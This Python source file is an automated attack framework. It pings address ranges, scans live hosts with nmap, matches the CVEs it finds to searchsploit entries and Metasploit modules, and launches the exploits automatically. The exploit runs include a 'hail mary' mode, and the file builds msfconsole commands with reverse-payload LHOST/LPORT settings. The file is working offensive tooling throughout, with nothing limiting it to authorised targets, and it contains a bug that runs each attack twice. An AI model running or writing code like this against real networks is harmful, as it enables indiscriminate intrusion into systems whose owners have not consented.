# ======================================================================================================================
# SCANNING / PINGING / CVE-FINDING / REPORT CREATION FUNCTIONS
# ======================================================================================================================
import subprocess
import threading
import time
import json
import os
import ping3

from autopwn_suite.api import AutoScanner
from lib.metasploit import *

msfconsole_command = 'msfconsole -x "use {};set RHOSTS {};set RPORT {};set LHOST {};set LPORT 443;show targets"'
max_scanning_threads = 10

def scan_host(ip: str, do_full_scan=False):
    global host_timeout, scan_speed, api_key, os_scan, scan_vulns, nmap_args, debug_scan, target_ports, all_scan_results
    global results_partial_dir, results_full_dir, all_scan_reports
    retry_count = 3 # Retry 3 times.
    results = {}
    scan_output_filename = f"{results_full_dir if do_full_scan else results_partial_dir}{ip}{'_full_results.json' if do_full_scan else '_partial_results.json'}"

    print(scan_output_filename)

    print("Starting scan.")
    scanner = AutoScanner()

    full_nmap_args = nmap_args + " "
    if do_full_scan:
        # pass
        full_nmap_args += "-p-"
    else:
        prefix = "-p"
        for port in target_ports:
            full_nmap_args += prefix + str(port)
            prefix = ","

    while retry_count > 0:
        try:
            if os.path.isfile(scan_output_filename):
                print(f"Found previous scan info, skpping scan of {ip}.")
                results = load_results_json(scan_output_filename)
            else:
                results = scanner.scan(ip, host_timeout=host_timeout, scan_speed=scan_speed, apiKey=api_key,
                                   os_scan=os_scan, scan_vulns=scan_vulns, nmap_args=full_nmap_args, debug=debug_scan)

                scanner.save_to_file(scan_output_filename)

            for ip in results:
                all_scan_results[ip] = results[ip]

                print("Automatically running MSF exploits with CVEs...")
                new_thread = threading.Thread(target=run_msf_against_scan_result_cves, args=[results])
                new_thread.start()
                run_msf_against_scan_result_cves(results)

                print("Automatically running MSF exploits with Products...")
                new_thread = threading.Thread(target=run_msf_against_scan_result_products, args=[results])
                new_thread.start()
                run_msf_against_scan_result_products(results)

                print("Automatically running MSF hail mary attack...")
                new_thread = threading.Thread(target=run_msf_hail_mary_scan_result, args=[results])
                new_thread.start()
                run_msf_hail_mary_scan_result(results)

                save_msf_metadata()

            retry_count = 0
        except Exception as e:
            print(f"Host scan failed. Are you running as root?: {e} {e.args}")
            retry_count -= 1
            if retry_count > 0:
                print("Retrying...")
                time.sleep(0.1)
            else:
                print("Not retrying...")

    retry_count = 3
    while retry_count > 0:
        try:
            exploit_report = parse_scan_results(results, do_full_scan)
            all_scan_reports.append(exploit_report)
            print(exploit_report)
            retry_count = 0
        except Exception as e:
            print(f"Unable to generated report: {e} {e.args}")
            retry_count -= 1
            if retry_count > 0:
                print("Retrying...")
                time.sleep(0.1)
            else:
                print("Not retrying...")

    print(f"Scan of {ip} complete.")


def ping_host(ip:str):
    global ip_list_string
    global ping_timeout
    retry_count = 3

    ip = ip.strip()
    while retry_count > 0:
        try:
            ping_result = ping3.ping(ip, timeout=ping_timeout)
            retry_count = 0
        except:
            retry_count -= 1
            if retry_count <= 0:
                print(f"PING ERROR: {ip}")
                return

    if ping_result is not None and type(ping_result) is not bool:
        print(f"Ping reply from {ip}")
        ip_list_string += ip + "\n"
        wait_for_open_thread(scan_thread_list, max_scanning_threads)
        add_scan_to_queue(ip, False)


def load_results_json(json_filename:str):
    with open(json_filename, "r") as fp:
        data = json.load(fp)

    return data


def search_for_cve(cve: str, ip: str, product: str, ports: list):
    global metasploit_modules_dir
    results = ""

    cve_parts = cve.split('-')
    if len(cve_parts) < 3:
        return

    searchsploit_cve = cve_parts[1] + "-" + cve_parts[2]
    result = subprocess.run(['searchsploit', '-j', '-o', '--cve', searchsploit_cve], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    try:
        searchsploit_result = json.loads(result.stdout)['RESULTS_EXPLOIT']
        if len(searchsploit_result) > 0:
            results += f"== SearchSploit Result ==\n{ip}: {product}: {cve}\nPorts: {ports}\n"
            for e in searchsploit_result:
                results += f"Title: {e['Title']}\nDate Published:{e['Date_Published']}\nPath: {e['Path']}\n\n"
    except Exception as e:
        print(f"Error with searchsploit search: {e}")

    metasploit_result = ""
    result = subprocess.run(['grep', '-F', '-r', '-i', '-l', searchsploit_cve, metasploit_modules_dir], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if result.returncode == 0:
        for line in result.stdout.decode("UTF-8").splitlines(keepends=True):
            metasploit_lines = []
            metasploit_line = line.replace(metasploit_modules_dir, "").replace(".rb\n", "")
            metasploit_result += metasploit_line + "\n"
            metasploit_lines.append(metasploit_line)

            command = ""
            for port in ports:
                for metasploit_line in metasploit_lines:
                    command += msfconsole_command.format(metasploit_line, ip, port, payload_lhost) + "\n"
                    if metasploit_line.find("exploits/") == 0:
                        run_msf_exploit(exploit_name=metasploit_line, rhosts=ip, rport=port)
            metasploit_result += command

        if len(metasploit_result) > 0:
            results += f"== Metasploit Result ==\n{ip}: {product}: {cve}\nPorts: {ports}\n{metasploit_result}\n"

    return results


def get_ports_from_product(scan_result: dict, ip: str, product: str):
    ports = []
    for ip_result in scan_result:
        if ip.upper().find(ip_result) < 0:
            continue
        for port in scan_result[ip]['ports']:
            scan_product: str = ""
            scan_product += scan_result[ip]['ports'][port]["product"]
            if scan_product.upper().find(product.upper()) >= 0:
                ports.append(int(port))

    return ports


def parse_scan_results(scan_result, is_full_scan=False):
    # Generate Report.
    report = ""
    for ip in scan_result:
        scan_output_filename = f"{results_full_dir if is_full_scan else results_partial_dir}{ip}{'_full_report.txt' if is_full_scan else '_partial_report.txt'}"
        if os.path.isfile(scan_output_filename):
            with open(scan_output_filename, "r", encoding="utf-8") as out_file:
                report += out_file.read()
            continue
        for product in scan_result[ip]['vulns']:
            for cve in scan_result[ip]['vulns'][product]:
                ports = get_ports_from_product(scan_result, ip, product)
                result = search_for_cve(cve, ip, product, ports)
                if len(result) > 0:
                    print(result)
                    report += result + "\n"

        with open(scan_output_filename, "w", encoding="utf-8") as out_file:
            out_file.write(report)

    return report


def wait_for_thread_list_to_end(threadlist: list):
    while len(threadlist) > 0:
        time.sleep(1)
        for thread in threadlist:
            if not thread.is_alive():
                threadlist.remove(thread)


def wait_for_open_thread(threadlist: list, max_threads: int):
    while len(threadlist) >= max_threads:
        time.sleep(0.1)
        for thread in threadlist:
            if not thread.is_alive():
                threadlist.remove(thread)


def create_scanning_thread(ip: str, full_scan: bool):
    global scan_thread_list
    ip = ip.strip()
    new_thread = threading.Thread(target=scan_host, args=[ip, full_scan])
    new_thread.start()
    scan_thread_list.append(new_thread)


def create_ping_thread(ip: str):
    global ping_thread_list
    global ignore_ips
    ip = ip.strip()

    for ignore_ip in ignore_ips:
        if ip == ignore_ip:
            return

    new_thread = threading.Thread(target=ping_host, args=[ip])
    new_thread.start()
    ping_thread_list.append(new_thread)


def add_scan_to_queue(ip: str, do_full_scan: bool):
    global scan_queue

    scan_queue.append((ip.strip(), do_full_scan))


def process_scan_queue():
    global scan_queue
    global do_continue_processing_scan_queue

    while len(scan_queue) > 0 or do_continue_processing_scan_queue:
        time.sleep(0.1)
        for scan in scan_queue:
            wait_for_open_thread(scan_thread_list, max_scanning_threads)
            create_scanning_thread(scan[0], scan[1])
            scan_queue.remove(scan)


def assemble_final_report():
    global all_scan_reports

    final_report = ""
    for report in all_scan_reports:
        final_report += report

    return final_report


